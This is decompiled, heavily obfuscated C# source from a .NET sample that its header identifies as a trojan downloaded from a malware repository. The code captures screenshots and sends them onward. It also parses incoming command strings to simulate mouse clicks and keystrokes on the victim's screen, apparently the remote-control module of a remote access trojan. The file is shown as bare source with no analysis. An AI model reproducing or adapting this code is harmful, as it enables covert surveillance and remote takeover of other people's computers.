// Decompiled with JetBrains decompiler
// Type: @Ԗ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

internal static class \u0040Ԗ
{
  internal static object \u0040ӓ;
  internal static object \u0040Ӕ;
  internal static bool \u0040ӕ;

  internal sealed class \u0040ӓ
  {
    public int \u0040ӓ;
    public \u0040Ԫ \u0040Ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040Ԗ.\u0040ӓ.\u0040ӗ();
      \u0040Ԗ.\u0040ӓ.\u0040Ә((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӕ()
    {
      int num1 = 2;
      while (true)
      {
        bool flag;
        switch (num1)
        {
          case 0:
          case 1:
            goto case 2;
          case 2:
            flag = !\u0040Ԗ.\u0040ӕ;
            num1 = 4;
            continue;
          case 4:
            if (flag)
            {
              try
              {
                Image image = (Image) \u0040ԝ.\u0040ӻ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ, true);
                int num2 = 1;
                \u0040Ԫ ӕ;
                string str;
                byte[] numArray;
                int num3;
                int height;
                int width;
                while (true)
                {
                  switch (num2)
                  {
                    case 0:
                    case 6:
                      \u0040ԝ.\u0040ڐ(ӕ, str, numArray);
                      num2 = 9;
                      continue;
                    case 1:
                      width = ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.Width;
                      num2 = 8;
                      continue;
                    case 2:
                    case 7:
                      num3 = 100 - this.\u0040ӓ;
                      num2 = 3;
                      continue;
                    case 3:
                      numArray = \u0040ԝ.\u0040ԯ(\u0040ԝ.\u0040\u055B(width, num3, image, height));
                      goto case 4;
                    case 4:
                      str = (string) \u0040Ԗ.\u0040ӓ.\u0040ӛ(555452);
                      num2 = 5;
                      continue;
                    case 5:
                      ӕ = this.\u0040Ӕ;
                      goto case 0;
                    case 8:
                      height = ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.Height;
                      num2 = !\u0040Ԗ.\u0040ӓ.\u0040ә() ? 0 : 7;
                      continue;
                    case 9:
                      goto label_17;
                    default:
                      num2 = 4;
                      continue;
                  }
                }
              }
              catch
              {
                \u0040Ԗ.\u0040ӓ.\u0040Ӝ();
              }
label_17:
              \u0040Ԗ.\u0040ӓ.\u0040ӝ(80);
              num1 = !\u0040Ԗ.\u0040ӓ.\u0040ә() ? 5 : 0;
              continue;
            }
            break;
          case 6:
            goto label_15;
        }
        \u0040Ԗ.\u0040ӕ = false;
        num1 = 6;
      }
label_15:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӗ()
    {
      \u0040Ԗ.\u0040ӓ.\u0040Ӛ();
      int num1;
      if (\u0040Ԗ.\u0040ӓ.\u0040ә())
      {
        if (!\u0040Ԗ.\u0040ӓ.\u0040Ӛ())
        {
          num1 = 3;
          goto label_4;
        }
      }
      else
        goto label_42;
label_2:
label_3:
      bool flag1 = !\u0040Ԗ.\u0040ӕ;
      goto label_43;
label_4:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_3;
          case 1:
            goto label_6;
          case 2:
          case 5:
            goto label_2;
          case 4:
            goto label_43;
          case 6:
            goto label_46;
          default:
            num1 = 4;
            continue;
        }
      }
label_46:
      return;
label_6:
      try
      {
        string str1 = \u0040ԝ.\u0040ԗ(\u0040ԝ.\u0040ލ(new \u0040ԥ(this.\u0040Ӕ, new \u0040ԩ[2]
        {
          new \u0040ԩ((string) \u0040ԑ.\u0040ӕ, (string) \u0040Ԗ.\u0040ӓ.\u0040Ӟ(\u0040Ԗ.\u0040ӓ.\u0040ӛ(555472), \u0040ԑ.\u0040ӕ), ""),
          new \u0040ԩ((string) \u0040ԑ.\u0040ӕ, (string) \u0040Ԗ.\u0040ӓ.\u0040Ӟ(\u0040Ԗ.\u0040ӓ.\u0040ӛ(555472), \u0040ԑ.\u0040ӕ))
        }))[\u0040ԝ.\u0040ܣ((string) \u0040Ԗ.\u0040ӓ.\u0040Ӟ(\u0040Ԡ.\u0040Ӕ.\u0040Ӕ, \u0040ԑ.\u0040ӕ))][\u0040ԝ.\u0040ܣ((string) \u0040Ԗ.\u0040ӓ.\u0040Ӟ(\u0040Ԡ.\u0040Ӕ.\u0040Ӕ, (object) \u0040ԝ.\u0040\u0590((string) \u0040Ԗ.\u0040ӓ.\u0040Ӟ(\u0040Ԗ.\u0040ӓ.\u0040ӛ(555472), \u0040ԑ.\u0040ӕ))))]);
        string[] strArray1 = new string[1]
        {
          (string) \u0040Ԗ.\u0040ӓ.\u0040ӛ(555492)
        };
        foreach (string str2 in (string[]) \u0040Ԗ.\u0040ӓ.\u0040ӟ((object) str1, (object) strArray1, StringSplitOptions.None))
        {
          if (\u0040Ԗ.\u0040ӓ.\u0040Ӡ((object) str2) >= 1)
          {
            if (\u0040Ԗ.\u0040ӓ.\u0040ӡ((object) str2, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555498)))
            {
              string[] strArray2 = (string[]) \u0040Ԗ.\u0040ӓ.\u0040ӟ((object) str2, (object) new string[1]
              {
                (string) \u0040Ԗ.\u0040ӓ.\u0040ӛ(555498)
              }, StringSplitOptions.None);
              string str3 = strArray2[0];
              if (!\u0040Ԗ.\u0040ӓ.\u0040Ӣ((object) str3, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555504)))
              {
                if (!\u0040Ԗ.\u0040ӓ.\u0040Ӣ((object) str3, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555510)))
                {
                  if (!\u0040Ԗ.\u0040ӓ.\u0040Ӣ((object) str3, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555518)))
                  {
                    if (!\u0040Ԗ.\u0040ӓ.\u0040Ӣ((object) str3, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555526)))
                    {
                      if (\u0040Ԗ.\u0040ӓ.\u0040Ӣ((object) str3, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555534)))
                        \u0040ԝ.\u0040֩(4U, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                        {
                          ','
                        })[0]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.X, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                        {
                          ','
                        })[1]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.Y, 0, UIntPtr.Zero);
                    }
                    else
                      \u0040ԝ.\u0040֩(2U, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                      {
                        ','
                      })[0]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.X, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                      {
                        ','
                      })[1]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.Y, 0, UIntPtr.Zero);
                  }
                  else
                    \u0040ԝ.\u0040֩(16U, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                    {
                      ','
                    })[0]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.X, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                    {
                      ','
                    })[1]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.Y, 0, UIntPtr.Zero);
                }
                else
                  \u0040ԝ.\u0040֩(8U, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                  {
                    ','
                  })[0]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.X, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                  {
                    ','
                  })[1]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.Y, 0, UIntPtr.Zero);
              }
              else
                \u0040ԝ.\u0040ذ(\u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                {
                  ','
                })[0]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.X, \u0040Ԗ.\u0040ӓ.\u0040Ӥ(\u0040Ԗ.\u0040ӓ.\u0040ӣ((object) strArray2[1], (object) new char[1]
                {
                  ','
                })[1]) + ((\u0040Ԛ) \u0040Ԗ.\u0040Ӕ).\u0040ӕ.Y);
            }
            else
            {
              try
              {
                bool flag2 = true;
                \u0040Ԗ.\u0040ӓ.\u0040Ӛ();
                int num2;
                if (\u0040Ԗ.\u0040ӓ.\u0040ә())
                {
                  if (\u0040Ԗ.\u0040ӓ.\u0040ә())
                  {
                    num2 = 1;
                    goto label_29;
                  }
                }
                else
                  goto label_27;
label_21:
label_22:
                byte num3;
                \u0040ԛ.\u0040ӕ.\u0040ӓ[] ӓArray = new \u0040ԛ.\u0040ӕ.\u0040ӓ[1]
                {
                  new \u0040ԛ.\u0040ӕ.\u0040ӓ()
                  {
                    \u0040ӓ = 1U,
                    \u0040Ӕ = new \u0040ԛ.\u0040ӕ.\u0040Ӕ()
                    {
                      \u0040Ӕ = new \u0040ԛ.\u0040ӕ.\u0040Ӗ()
                      {
                        \u0040ӓ = (ushort) num3,
                        \u0040Ӕ = (ushort) 0,
                        \u0040ӕ = flag2 ? 0U : 2U,
                        \u0040ӗ = \u0040ԝ.\u0040א()
                      }
                    }
                  }
                };
                num2 = 2;
                goto label_29;
label_27:
                num2 = 8;
label_29:
                bool flag3;
                while (true)
                {
                  switch (num2)
                  {
                    case 0:
                    case 1:
                      num3 = (byte) 0;
                      num2 = 6;
                      continue;
                    case 2:
                      // ISSUE: type reference
                      int num4 = (int) \u0040ԝ.\u0040\u05F9((uint) ӓArray.Length, ӓArray, \u0040Ԗ.\u0040ӓ.\u0040Ө(\u0040Ԗ.\u0040ӓ.\u0040ӧ(__typeref (\u0040ԛ.\u0040ӕ.\u0040ӓ))));
                      num2 = 10;
                      continue;
                    case 3:
                      goto label_26;
                    case 4:
                      goto label_21;
                    case 5:
                    case 8:
                      goto label_22;
                    case 6:
                      flag3 = \u0040Ԗ.\u0040ӓ.\u0040ӡ((object) str2, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555542));
                      num2 = 7;
                      continue;
                    case 7:
                      if (!flag3)
                      {
                        num3 = \u0040Ԗ.\u0040ӓ.\u0040Ӧ((object) str2);
                        num2 = 4;
                        continue;
                      }
                      num2 = 9;
                      continue;
                    case 9:
                      goto label_28;
                    case 10:
                      goto label_35;
                    default:
                      num2 = 3;
                      continue;
                  }
                }
label_26:
                num3 = \u0040Ԗ.\u0040ӓ.\u0040Ӧ(\u0040Ԗ.\u0040ӓ.\u0040ӥ((object) str2, \u0040Ԗ.\u0040ӓ.\u0040ӛ(555542), (object) ""));
                goto label_22;
label_28:
                flag2 = false;
                goto label_26;
              }
              catch
              {
              }
label_35:;
            }
            \u0040Ԗ.\u0040ӓ.\u0040ӝ(1);
          }
        }
      }
      catch
      {
      }
      \u0040Ԗ.\u0040ӓ.\u0040ӝ(100);
      goto label_2;
label_42:
      num1 = 5;
      if (true)
        goto label_4;
label_43:
      if (!flag1)
      {
        if (\u0040Ԗ.\u0040ӓ.\u0040ә())
        {
          num1 = 6;
          goto label_4;
        }
        else
          goto label_3;
      }
      else
      {
        int num5 = 1;
        num1 = \u0040Ԗ.\u0040ӓ.\u0040Ӛ() ? num5 : num5;
        goto label_4;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӗ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ә(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ә() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӛ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӛ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӝ() => GC.Collect();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӝ(int _param0) => Thread.Sleep(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӟ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӟ(object _param0, object _param1, StringSplitOptions _param2) => (object) ((string) _param0).Split((string[]) _param1, _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ӡ(object _param0) => ((string) _param0).Length;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӡ(object _param0, object _param1) => ((string) _param0).Contains((string) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӣ(object _param0, object _param1) => (string) _param0 == (string) _param1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӣ(object _param0, object _param1) => (object) ((string) _param0).Split((char[]) _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ӥ(object _param0) => Convert.ToInt32((string) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӥ(object _param0, object _param1, object _param2) => (object) ((string) _param0).Replace((string) _param1, (string) _param2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static byte \u0040Ӧ(object _param0) => Convert.ToByte((string) _param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static Type \u0040ӧ(RuntimeTypeHandle _param0) => Type.GetTypeFromHandle(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ө(Type _param0) => Marshal.SizeOf(_param0);
  }
}
